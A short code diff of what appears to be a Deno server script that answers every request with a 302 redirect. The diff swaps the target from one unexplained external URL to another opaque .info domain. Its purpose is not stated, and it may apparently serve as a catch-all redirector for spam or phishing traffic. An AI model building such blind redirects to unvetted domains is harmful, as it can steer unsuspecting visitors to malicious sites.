@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://waroeng88.org/wp-content/secure/",
+      Location: "https://potlatch1revlwtoday.info/p1/",
     },
   });
 });
